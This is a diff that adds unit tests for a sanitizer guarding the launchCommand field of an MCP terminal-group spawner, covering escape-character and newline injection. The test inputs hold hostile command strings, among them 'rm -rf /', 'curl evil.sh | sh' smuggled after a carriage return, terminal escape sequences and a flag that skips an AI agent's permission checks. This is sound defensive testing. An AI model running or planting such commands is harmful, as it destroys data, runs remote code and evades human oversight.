@@ -428,4 +428,88 @@ describe('createMcpLifecycle.spawnGroup (PR-5b — feature-zone cluster)', () =>
     await life.spawnGroup({ name: 'x'.repeat(200) })
     expect((sent[0].group as { name: string }).name).toHaveLength(80)
   })
+
+  describe('🔒 F5: launchCommand sanitizer (DEL + C1 escape-injection fix)', () => {
+    // Re-use the recordingReg / makeLife helpers from the enclosing describe block.
+    const launchOf = (cmd: Record<string, unknown>): string | undefined =>
+      (cmd.members as { terminal: { launchCommand?: string } }).terminal.launchCommand
+
+    it('strips DEL (0x7F) from a launchCommand — was passed by the old c >= " " filter', async () => {
+      const { registry, sent, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      await life.spawnGroup({
+        name: 'zone',
+        launchCommand: 'claude\x7f --dangerously-skip-permissions'
+      })
+      expect(launchOf(sent[0])).toBe('claude --dangerously-skip-permissions')
+    })
+
+    it('strips C1 CSI (U+009B) — 8-bit terminal escape-sequence opener', async () => {
+      const csi = String.fromCodePoint(0x9b)
+      const { registry, sent, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      await life.spawnGroup({ name: 'zone', launchCommand: `claude${csi}[2J` })
+      expect(launchOf(sent[0])).toBe('claude[2J')
+    })
+
+    it('strips C1 NEL (U+0085) — newline-equivalent in 8-bit terminals', async () => {
+      const nel = String.fromCodePoint(0x85)
+      const { registry, sent, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      await life.spawnGroup({ name: 'zone', launchCommand: `claude${nel}rm -rf /` })
+      // NEL stripped, not treated as a line break that injects a second command.
+      expect(launchOf(sent[0])).toBe('clauderm -rf /')
+    })
+
+    it('strips the full C1 range U+0080–U+009F (all 32 code points)', async () => {
+      let payload = 'cmd'
+      for (let cp = 0x80; cp <= 0x9f; cp++) payload += String.fromCodePoint(cp)
+      payload += 'suffix'
+      const { registry, sent, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      await life.spawnGroup({ name: 'zone', launchCommand: payload })
+      expect(launchOf(sent[0])).toBe('cmdsuffix')
+    })
+
+    it('strips bare ESC (U+001B) — C0 terminal-escape opener', async () => {
+      const { registry, sent, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      await life.spawnGroup({ name: 'zone', launchCommand: 'claude\x1b[1;31mmalicious' })
+      expect(launchOf(sent[0])).toBe('claude[1;31mmalicious')
+    })
+
+    it('rejects a launchCommand with an embedded LF (DispatchPayloadError — multi-line injection)', async () => {
+      const { registry, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      await expect(
+        life.spawnGroup({ name: 'zone', launchCommand: 'claude\nrm -rf /' })
+      ).rejects.toThrow(/newline|CR|LF/i)
+    })
+
+    it('rejects a launchCommand with an embedded CR (PTY line-submit injection)', async () => {
+      const { registry, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      await expect(
+        life.spawnGroup({ name: 'zone', launchCommand: 'claude\rcurl evil.sh | sh' })
+      ).rejects.toThrow(/newline|CR|LF/i)
+    })
+
+    it('leaves printable non-ASCII above U+009F intact (legitimate chars must survive)', async () => {
+      const { registry, sent, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      // U+00A0 = NBSP (first code point above the C1 range), plus accented chars.
+      const input = 'café  --flag'
+      await life.spawnGroup({ name: 'zone', launchCommand: input })
+      expect(launchOf(sent[0])).toBe(input)
+    })
+
+    it('leaves launchCommand undefined when the sanitized result is empty', async () => {
+      const { registry, sent, boards } = recordingReg()
+      const life = makeLife(registry, boards)
+      // A string of only C1 characters sanitizes to '' → should be omitted from the envelope.
+      const allC1 = Array.from({ length: 32 }, (_, i) => String.fromCodePoint(0x80 + i)).join('')
+      await life.spawnGroup({ name: 'zone', launchCommand: allC1 })
+      expect(launchOf(sent[0])).toBeUndefined()
+    })
+  })
 })
